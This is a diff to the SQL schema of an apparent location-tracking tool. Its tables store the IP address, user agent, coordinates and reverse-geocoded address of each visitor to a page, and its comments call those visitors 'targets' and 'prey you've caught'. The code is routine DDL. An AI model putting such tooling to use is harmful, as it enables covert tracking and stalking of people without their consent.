@@ -18,8 +18,7 @@ CREATE TABLE devices (
 	token VARCHAR(50) NOT NULL, -- We need a unique way for each client to identify themselves on the client side in order to be able to support multiple clients at once -- to do this, we just open a PHP session with anybody who opens the page. They then send their cookie back with each request and we use that to tell which user we should log the ping against. Note that this actually logs sessions, not individual devices, so if a target somehow drops their session (at time of writing my code never clears it, and I'm not The Big Man when it comes to PHP in general, so I don't know exactly when else this can happen -- the only thing I can think of is them opening the page in a different browser or on a different device, which is slightly odd behaviour), then they'll appear as a different target. However, hopefully they'll appear in a similar-ish location, maybe even with the same IP address and user agent (unless they did switch browsers/devices), so you might be able to tell if it's likely to be the same person using only your brain.
 	user_agent VARCHAR(100) NOT NULL, -- This can help you identify what kind of prey you've caught
 	ip_remote_addr VARCHAR(50) NOT NULL, -- One of these two
-	ip_forwarded_for VARCHAR(50) NULL, -- values could be the user's real IP
-	time_located DATETIME NOT NULL -- When the user was first located
+	ip_forwarded_for VARCHAR(50) NULL -- values could be the user's real IP
 ) ENGINE = InnoDB;
 -- locations: where all of the user locations get stored. Inserted into by logme/.
 DROP TABLE IF EXISTS locations;
@@ -29,8 +28,9 @@ CREATE TABLE locations (
 	latitude DOUBLE NOT NULL, -- Half a coordinate
 	longitude DOUBLE NOT NULL, -- The other half of the coordinate
 	address VARCHAR(100) NOT NULL, -- Their address, reverse geocoded from the coordinates
+	time_located DATETIME NOT NULL, -- The time at which the location ping was received
 	CONSTRAINT `fk_location_device` -- Delete all location data about a device when the device is deleted
-		FOREIGN KEY (`target_id`) REFERENCES `devices` (`id`)
+		FOREIGN KEY (`device_id`) REFERENCES `devices` (`id`)
 		ON DELETE CASCADE
 		ON UPDATE CASCADE
 ) ENGINE = InnoDB;
